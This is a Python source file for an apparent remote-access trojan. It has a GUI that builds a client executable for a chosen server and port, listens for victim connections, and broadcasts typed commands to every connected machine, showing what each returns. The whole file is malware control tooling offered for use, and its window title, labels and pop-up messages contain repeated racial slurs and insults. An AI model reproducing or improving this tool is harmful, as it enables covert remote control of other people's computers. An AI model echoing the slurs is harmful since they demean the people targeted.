import socket
import threading
import os, json
import customtkinter as ctk
from tkinter import *
from tkinter import messagebox

from Modules.builder import Builder

# ---------------------------------- #

class Colors:
    main = "#2a2a2b"

root = ctk.CTk()
color = Colors()
root.title("Leet Nigga Builder")
root.iconbitmap("Images/hackz.ico")
root.config(
    bg=color.main
)
root.geometry("800x500")

tabs = ctk.CTkTabview(root)
tabs.pack(fill="both", expand=True)

tabs.add("Builder")
builder = tabs.tab("Builder")
tabs.add("Data")
data = tabs.tab("Data")
tabs.add("Commands")
commands = tabs.tab("Commands")

# ---------------------------------- #

builder_ = Builder()
connections = []

class Listener:
    def __init__(self):
        pass

    def data(self):
        with open("settings.json", "r") as f:
            d = json.load(f)
        return d['server'], d['port']

    def listen(self):
        global status_
        status_ = "Listening"

        try:
            HOST = self.data()[0]
            PORT = int(self.data()[1])

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((HOST, PORT))
            s.listen(15)
            co, ca = s.accept()
            connections.append(co)
            messagebox.showinfo(title="LOL", message="a dumb nigger just connected which doesn't matter because this shit is ass and you cannot really do much ")
        except:
            messagebox.showerror(title="Error", message="you prolly provided a invalid ip retard")

listener = Listener()
status_ = None

class UI:
    def __init__(self):
        pass


    def builder(self):
        lab = Label(builder, text="nigga", bg=color.main, fg='white')
        lab.pack(side="bottom")

        server = ctk.CTkEntry(builder, placeholder_text="127.0.0.1")
        port = ctk.CTkEntry(builder, placeholder_text="65432")
        sl = Label(builder, text="Server:", bg=color.main, font=("bold", 15), fg='white')
        pl = Label(builder, text="Port:", bg=color.main, font=("bold", 15), fg='white')

        sl.place(x=20, y=20)
        pl.place(x=20, y=60)

        def build():
            s = server.get()
            p = port.get()

            if s == "":
                messagebox.showerror(title="Error", message="Must provide a server")
                return
            if p == "":
                messagebox.showerror(title="Error", message="Must provide a port number")
                return
            
            if s == "127.0.0.1":
                builder_.buildLOCAL(p)

                def created():
                    f = os.listdir("Output")
                    fc = sum(1 for f in f if os.path.isfile(os.path.join("Output", f)))
                    
                    if fc >= 1:
                        return
                    else:
                        return False

                if created() == False:
                    messagebox.showerror(title="Error", message="Failed to compile the hackz")
                    return
                messagebox.showinfo(title="Built", message="The exe can be found in the Output folder")
            else:
                builder_.build(s, p)

                def created():
                    f = os.listdir("Output")
                    fc = sum(1 for f in f if os.path.isfile(os.path.join("Output", f)))
                    
                    if fc >= 1:
                        return
                    else:
                        return False

                if created() == False:
                    messagebox.showerror(title="Error", message="Failed to compile the hackz")
                    return
                messagebox.showinfo(title="Built", message="The exe can be found in the Output folder")

        build_ = ctk.CTkButton(builder, text="build", command=build)
        build_.place(x=20, y=120)

        server.place(x=120, y=20)
        port.place(x=120, y=60)

    def data(self):
        def data_():
            with open("settings.json", "r") as f:
                d = json.load(f)

                return d['server'], d['port']
        
        def update_():
            while True:
                server.config(text=f"Server: {data_()[0]}")
                port.config(text=f"Port: {data_()[1]}")
                conn.config(text=f"Connections: {len(connections)}")
                status.config(text=f"Status: {status_}")

        server = Label(data, text=f"Server: {data_()[0]}", fg='white', bg=color.main, font=('bold', 15))
        port = Label(data, text=f"Port: {data_()[1]}", bg=color.main, font=('bold', 15), fg='white')
        conn = Label(data, text=f"Connections: {len(connections)}", fg='white', bg=color.main, font=('bold', 15))

        server.place(x=20, y=20)
        port.place(x=20, y=60)
        conn.place(x=20, y=100)

        start_ = ctk.CTkButton(data, text="Start Listening", command=lambda: threading.Thread(target=listener.listen).start())
        start_.place(x=20, y=140)

        status = Label(data, text="Status: None", fg='white', bg=color.main, font=('bold', 15))
        status.pack(side="bottom")

        threading.Thread(target=update_).start()

    def commands(self):
        lab = Label(commands, text="Sends a command to all connections", fg='white', bg=color.main, font=('bold', 15))
        lab.pack(side="bottom")

        cmd = ctk.CTkEntry(commands, placeholder_text="command")
        cmd.place(x=20, y=20)

        def send_():
            onehundredperecentfluffyhairsigimasigimaboysigimaboy = cmd.get()
            if len(connections) == 0:
                messagebox.showerror(title="Error", message="buddy there's no one connected")
                return
            
            messagebox.showwarning(title="Bud", message="this might take a while depending on ur connections buddy")

            for conn in connections:
                conn.sendall(onehundredperecentfluffyhairsigimasigimaboysigimaboy.encode())
                data = conn.recv(1024).decode()
                messagebox.showinfo(title="Response", message=str(data))

        send = ctk.CTkButton(commands, text="Send", command=lambda: threading.Thread(target=send_).start())
        send.place(x=20, y=60)

    def start(self):
        self.builder()
        self.data()
        self.commands()
        root.mainloop()

# ---------------------------------- #

def main():
    ui = UI()
    ui.start()

if __name__ == "__main__":
    main()